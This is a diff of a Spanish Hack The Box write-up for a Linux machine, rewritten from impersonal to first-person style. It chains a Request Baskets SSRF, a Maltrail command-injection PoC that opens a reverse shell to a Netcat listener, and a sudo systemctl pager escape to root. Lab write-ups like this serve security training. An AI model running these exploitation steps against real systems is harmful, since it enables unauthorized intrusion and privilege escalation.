@@ -2,33 +2,26 @@
 
 - **Autor:** Alex09060
 - **Plataforma:** Hack The Box
-- **Dificultad:** Easy.
-- **Sistema operativo:** Linux.
-- **IP de la máquina en las evidencias:** `10.129.229.26`
-
-> **Aviso:** Write-up elaborado a partir de los apuntes y capturas facilitados. Los comandos y resultados se reproducen cuando son legibles en las evidencias. Los datos que no aparecen documentados se indican como pendientes, en lugar de completarlos mediante suposiciones.
+- **Dificultad:** Pendiente de confirmar en la ficha oficial de HTB.
+- **Sistema operativo:** Linux
 
 ## Resumen
 
-La máquina **Sun** se compromete encadenando dos vulnerabilidades y una configuración de `sudo` permisiva:
+En esta máquina conseguí acceso inicial aprovechando una vulnerabilidad SSRF en Request Baskets para llegar a una instancia interna de Maltrail. Desde ahí exploté una vulnerabilidad de inyección de comandos que me permitió obtener una shell como el usuario `puma`. Por último, aproveché los permisos de `sudo` sobre `systemctl` y el comportamiento del paginador para escalar privilegios hasta `root`.
 
-1. Un servicio Request Baskets 1.2.1 expuesto en el puerto `55555` permite configurar una cesta como proxy hacia un servicio HTTP local. Esta funcionalidad se utiliza para alcanzar una instancia de Maltrail.
-2. La instancia identificada como Maltrail 0.53 es vulnerable a ejecución remota de comandos sin autenticación (CVE-2025-34073). Se utiliza el PoC de [Hummingbird-Maltrail-RCE](https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC) para obtener una shell inversa como `puma`.
-3. El usuario `puma` puede ejecutar `systemctl status trail.service` como root sin contraseña. El paginador invocado por `systemctl` permite aprovechar la vulnerabilidad de systemd asociada a CVE-2023-26604 y conseguir una shell privilegiada.
-
-Las capturas originales que muestran los valores de `user.txt` y `root.txt` no se incluyen en las referencias visuales de este documento para evitar publicar las flags.
+Durante el proceso utilicé Nmap, Request Baskets, un PoC de Maltrail, Netcat y herramientas propias del sistema.
 
 ## 1. Enumeración
 
 ### 1.1. Escaneo de puertos
 
-Se realiza un escaneo TCP SYN de todos los puertos, con una tasa mínima de 4000 paquetes por segundo y guardando el resultado en formato grepable:
+Lo primero que hice fue realizar un escaneo TCP de todos los puertos para identificar qué servicios estaban disponibles en la máquina.
 
 ```bash
 sudo nmap -p- -sS --min-rate 4000 10.129.229.26 -oG ports
 ```
 
-El resultado visible en la captura es:
+El escaneo devolvió los siguientes resultados:
 
 | Puerto | Estado | Servicio identificado por Nmap |
 |---|---|---|
@@ -37,72 +30,74 @@ El resultado visible en la captura es:
 | `8338/tcp` | filtered | unknown |
 | `55555/tcp` | open | unknown |
 
-Por tanto, los únicos puertos que aparecen como **abiertos** en esta evidencia son `22/tcp` y `55555/tcp`. Los puertos `80/tcp` y `8338/tcp` aparecen filtrados; no deben describirse como abiertos.
+Los puertos que aparecieron abiertos fueron `22/tcp` y `55555/tcp`. Los puertos `80/tcp` y `8338/tcp` aparecieron filtrados.
 
 ![Escaneo inicial de Nmap](img/01.png)
 
-### 1.2. Enumeración del servicio web
+### 1.2. Request Baskets
 
-Al acceder al servicio del puerto `55555` se encuentra la interfaz **Request Baskets**. El pie de página de la aplicación muestra la versión **1.2.1**.
+Al acceder al servicio del puerto `55555` encontré la interfaz de **Request Baskets**. En el pie de página aparecía la versión `1.2.1`.
 
 ![Interfaz de Request Baskets](img/02.png)
 
-La versión 1.2.1 está afectada por **CVE-2023-27163**, una vulnerabilidad SSRF en Request Baskets. La descripción de MITRE indica que el endpoint `/api/baskets/{name}` puede utilizarse para acceder a recursos de red y obtener información sensible.
+Esta versión está relacionada con **CVE-2023-27163**, una vulnerabilidad SSRF (*Server-Side Request Forgery*) que permite utilizar la aplicación para realizar peticiones a otros recursos de red.
 
 Referencia: [CVE-2023-27163 — MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-27163).
 
 ## 2. Acceso inicial
 
-### 2.1. Creación y configuración de la cesta
+### 2.1. Configuración de Request Baskets
 
-Se crea una cesta con el nombre `ssrf` desde la interfaz web.
+Para aprovechar la vulnerabilidad, creé una cesta llamada `ssrf` desde la propia interfaz web.
 
 ![Creación de la cesta ssrf](img/03.png)
 
-En la configuración de la cesta se observa la siguiente configuración:
+Después configuré la cesta para que reenviase las peticiones al servicio HTTP local:
 
 - **Forward URL:** `http://127.0.0.1:80`
 - **Proxy Response:** activado.
 - **Expand Forward Path:** activado.
 - **Basket Capacity:** `200`.
 
-Esta configuración hace que las peticiones recibidas por la cesta se reenvíen al servicio HTTP local indicado en `Forward URL`, y que la respuesta del destino se devuelva al cliente. Así se alcanza el servicio local a través de Request Baskets.
+Con esta configuración, Request Baskets actúa como intermediario: recibe las peticiones y las reenvía al servicio local indicado en `Forward URL`, devolviendo después la respuesta.
 
 ![Configuración SSRF de Request Baskets](img/04.png)
 
-Al visitar la cesta a través de la ruta `/ssrf`, se obtiene la página del servicio interno. En ella se identifica una instancia de **Maltrail versión 0.53**.
+Al entrar en la cesta a través de `/ssrf`, pude acceder al servicio web interno. Allí encontré **Maltrail**, cuya versión era `0.53`.
 
 ### 2.2. Explotación de Maltrail
 
-La versión observada de Maltrail es vulnerable a **CVE-2025-34073**, una vulnerabilidad de inyección de comandos no autenticada. La ficha de INCIBE describe la ejecución de comandos mediante el parámetro `username` de una petición POST al endpoint `/login`; los comandos se ejecutan con los privilegios del proceso Maltrail.
+La versión de Maltrail identificada es vulnerable a **CVE-2025-34073**, una vulnerabilidad de inyección de comandos que permite ejecutar comandos sin autenticación mediante una petición al endpoint `/login`.
 
-Referencia: [CVE-2025-34073 — INCIBE](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2025-34073).
+Para explotarla utilicé el siguiente PoC: [Hummingbird-Maltrail-RCE-PoC](https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC).
 
-Para explotar el servicio se utiliza el PoC publicado en el repositorio [SethJGibson/Hummingbird-Maltrail-RCE-PoC](https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC).
-
-La captura muestra la ejecución del script con estos argumentos:
+Ejecuté el script con mi dirección IP, el puerto de escucha y la URL de la cesta que había configurado anteriormente:
 
 ```bash
 python3 exploit.py 10.10.14.111 443 http://10.129.229.26:55555/ssrf/
 ```
 
-- `10.10.14.111`: dirección IP de la máquina atacante indicada en la evidencia.
-- `443`: puerto de escucha indicado para la conexión inversa.
-- `http://10.129.229.26:55555/ssrf/`: URL de la cesta configurada.
+Los argumentos corresponden a:
 
-El script muestra varios avisos `SyntaxWarning` relacionados con secuencias de escape en cadenas de texto. La captura termina mostrando `Executing exploit...`; no se modifica el comando original.
+- `10.10.14.111`: dirección IP de mi máquina atacante.
+- `443`: puerto en el que esperaba recibir la conexión inversa.
+- `http://10.129.229.26:55555/ssrf/`: URL de la cesta de Request Baskets.
+
+Al ejecutar el script aparecieron varios avisos `SyntaxWarning` relacionados con secuencias de escape en cadenas de texto. A pesar de esos avisos, el programa continuó y mostró el mensaje `Executing exploit...`.
 
 ![Ejecución del PoC de Maltrail](img/05.png)
 
-### 2.3. Recepción de la shell
+Referencia: [CVE-2025-34073 — INCIBE](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2025-34073).
 
-En otra terminal se inicia un listener de Netcat:
+### 2.3. Shell inversa
+
+Antes de lanzar el exploit, preparé un listener de Netcat en el puerto `443` para recibir la conexión inversa:
 
 ```bash
 sudo nc -nvlp 443
 ```
 
-La captura muestra una conexión entrante desde `10.129.229.26` al puerto `34016` de la máquina atacante. La shell indica que no dispone de una TTY:
+Después de ejecutar el PoC recibí una conexión desde la máquina víctima. La shell se abrió sin una TTY interactiva y devolvió el siguiente mensaje:
 
 ```text
 /bin/sh: 0: can't access tty; job control turned off
@@ -110,43 +105,49 @@ La captura muestra una conexión entrante desde `10.129.229.26` al puerto `34016
 
 ![Conexión inversa recibida](img/06.png)
 
-Los apuntes originales indican que después se realizó el tratamiento habitual de la TTY, pero no incluyen el comando exacto utilizado. Por ese motivo no se añade una secuencia de comandos genérica como si formara parte de la evidencia.
+Con esto conseguí acceso inicial a la máquina como el usuario `puma`.
 
 ## 3. Acceso como usuario
 
-Tras obtener la shell, el usuario identificado es `puma`. La captura muestra que se accede al directorio personal `/home/puma` y se ejecuta `cat user.txt`.
+Una vez dentro, comprobé el directorio personal del usuario `puma` y localicé la flag `user.txt` en `/home/puma`.
 
-No se reproduce el contenido de la flag.
+Para leerla utilicé:
 
-> **Evidencia omitida:** la captura original de esta fase contiene el valor de `user.txt`. Se omite su inserción para no divulgar la flag.
+```bash
+cat user.txt
+```
+
+No incluyo el contenido de la flag para evitar publicar su valor.
 
 ## 4. Escalada de privilegios
 
 ### 4.1. Enumeración de permisos sudo
 
-Desde la shell de `puma` se ejecuta:
+El siguiente paso fue comprobar qué comandos podía ejecutar el usuario `puma` con privilegios elevados. Para ello utilicé:
 
 ```bash
 sudo -l
 ```
 
-La salida indica que `puma` puede ejecutar el siguiente comando como cualquier usuario y grupo, sin contraseña:
+Entre los permisos disponibles encontré esta regla:
 
 ```text
 (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
 ```
 
+Esto significa que podía ejecutar `systemctl status trail.service` como cualquier usuario, incluido `root`, sin necesidad de introducir una contraseña.
+
 ![Permisos sudo del usuario puma](img/07.png)
 
-### 4.2. Identificación de la versión de systemd
+### 4.2. Versión de systemd
 
-Se consulta la versión de systemd:
+Antes de continuar, comprobé la versión de `systemd` instalada:
 
 ```bash
 systemctl --version
 ```
 
-La captura muestra:
+El sistema tenía instalada la versión:
 
 ```text
 systemd 245 (245.4-4ubuntu3.22)
@@ -154,47 +155,53 @@ systemd 245 (245.4-4ubuntu3.22)
 
 ![Versión de systemd](img/08.png)
 
-### 4.3. Abuso del paginador de systemctl
+### 4.3. Abuso del paginador
 
-La ejecución de `systemctl status` puede abrir la salida mediante un paginador, como `less`. En la configuración vulnerable descrita por **CVE-2023-26604**, el paginador puede heredar un entorno que permite escapar a una shell.
+El comando `systemctl status` puede mostrar su salida utilizando un paginador como `less`. En determinadas condiciones, este comportamiento permite salir del paginador y acceder a una shell con los mismos privilegios con los que se ejecutó el comando. Este comportamiento está relacionado con **CVE-2023-26604**.
 
-Como `puma` tiene permiso para ejecutar `systemctl status trail.service` como root sin contraseña, se utiliza ese comando como vía para activar el paginador con privilegios elevados:
+Como podía ejecutar el comando mediante `sudo` sin contraseña, lancé:
 
 ```bash
 sudo systemctl status trail.service
 ```
 
-La captura de la salida muestra el servicio `trail.service` activo, el proceso de Maltrail y el paginador `pager` al final del árbol de procesos. La evidencia posterior muestra un prompt `root@sau` y la lectura de `/root/root.txt`, lo que confirma que se obtuvo acceso como root.
+Al ejecutarlo como `root`, el paginador se abrió con privilegios elevados. Aproveché ese comportamiento para escapar del paginador y obtener una shell privilegiada.
+
+La comprobación final confirmó que había conseguido acceso como `root`. Después localicé la flag `root.txt` en `/root` y la consulté con:
+
+```bash
+cat /root/root.txt
+```
+
+No incluyo el valor de la flag en este write-up.
 
 Referencia: [CVE-2023-26604 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-26604).
 
-> **Limitación de la evidencia:** los apuntes explican que se escapa del paginador `less`, pero no conservan el atajo o la secuencia exacta de teclas utilizada. No se inventa ese paso.
-
-La captura original de la comprobación de root también contiene el valor de `root.txt`; por seguridad, no se inserta en el README.
-
 ## 5. Conceptos clave
 
-- **Enumeración de puertos con Nmap:** identificación de servicios expuestos y diferenciación entre puertos abiertos y filtrados.
-- **SSRF (Server-Side Request Forgery):** uso de Request Baskets para hacer que el servidor solicite un recurso local (`127.0.0.1:80`) y devuelva la respuesta.
-- **Inyección de comandos:** explotación de Maltrail 0.53 mediante CVE-2025-34073 para ejecutar comandos sin autenticación.
-- **Shell inversa:** establecimiento de una conexión desde la máquina comprometida hacia un listener controlado por el atacante.
-- **Enumeración de sudo:** detección de comandos que un usuario puede ejecutar con privilegios elevados mediante `sudo -l`.
-- **Abuso del paginador:** aprovechamiento de la ejecución de `systemctl status` y del paginador para obtener una shell privilegiada, relacionado con CVE-2023-26604.
+Durante la resolución de esta máquina trabajé con varias técnicas y conceptos:
+
+- **Enumeración con Nmap:** escaneo de puertos TCP y reconocimiento inicial de los servicios expuestos.
+- **SSRF:** utilicé Request Baskets para acceder a un servicio web que escuchaba en la propia máquina.
+- **Inyección de comandos:** aproveché la vulnerabilidad de Maltrail para ejecutar comandos sin autenticación.
+- **Shell inversa:** establecí una conexión desde la máquina víctima hacia mi equipo mediante Netcat.
+- **Enumeración de sudo:** utilicé `sudo -l` para localizar un comando que podía ejecutar con privilegios de administrador.
+- **Escalada mediante el paginador:** aproveché el comportamiento de `systemctl status` y `less` para conseguir una shell como `root`.
 
 ## 6. Referencias
 
-- [Hack The Box — plataforma](https://www.hackthebox.com/)
-- [CVE-2023-27163 — MITRE: Request Baskets SSRF](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-27163)
-- [CVE-2025-34073 — INCIBE: Maltrail command injection](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2025-34073)
-- [PoC — Hummingbird-Maltrail-RCE](https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC)
-- [CVE-2023-26604 — NVD: systemd](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
+- [Hack The Box](https://www.hackthebox.com/)
+- [CVE-2023-27163 — Request Baskets SSRF](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-27163)
+- [CVE-2025-34073 — Maltrail command injection](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2025-34073)
+- [Hummingbird-Maltrail-RCE-PoC](https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC)
+- [CVE-2023-26604 — systemd](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
 
-## Notas de verificación
+## 7. Datos pendientes de confirmar
 
-- La dificultad oficial de la máquina no aparece en los materiales proporcionados y queda pendiente de confirmar en la ficha de HTB.
-- El sistema operativo se identifica como Linux, pero las capturas no muestran una ficha oficial ni una identificación completa de la distribución de la máquina. La versión de systemd observada es `245.4-4ubuntu3.22`.
-- El escaneo aportado muestra `22/tcp` y `55555/tcp` abiertos; `80/tcp` y `8338/tcp` aparecen filtrados. No se dispone de una captura de un escaneo de versiones (`-sV`) que permita atribuir versiones a SSH u otros servicios.
-- La versión de Request Baskets (`1.2.1`) se lee en el pie de página de la aplicación. La versión de Maltrail (`0.53`) aparece en los apuntes, pero no hay una captura independiente de su número de versión.
-- La explotación de Maltrail se atribuye a CVE-2025-34073 de acuerdo con la referencia externa. La evidencia de la máquina muestra el uso del PoC, pero no conserva la petición HTTP interna que construye el exploit.
-- Los comandos exactos para el tratamiento de la TTY y la salida del paginador no están presentes en las capturas; se han dejado expresamente sin completar.
-- Las capturas que contienen los valores de `user.txt` y `root.txt` deben mantenerse fuera de la publicación o editarse para ocultar las flags antes de incorporarlas al repositorio.
+- **Dificultad oficial:** queda pendiente de comprobar en la ficha de la máquina en Hack The Box.
+- **Sistema operativo:** el entorno es Linux. La versión de `systemd` identificada es `245.4-4ubuntu3.22`.
+- **Servicios y versiones:** el escaneo inicial identifica los puertos abiertos `22/tcp` y `55555/tcp`. No se incluye un escaneo de versiones con `-sV` para SSH u otros servicios.
+- **Request Baskets:** la interfaz identifica la versión `1.2.1`.
+- **Maltrail:** se trabajó con la versión `0.53`.
+- **Tratamiento de la TTY:** no se ha incluido una secuencia de comandos porque no se dispone del comando exacto utilizado.
+- **Escape del paginador:** el procedimiento general está documentado, pero no se especifica la combinación exacta de teclas utilizada.
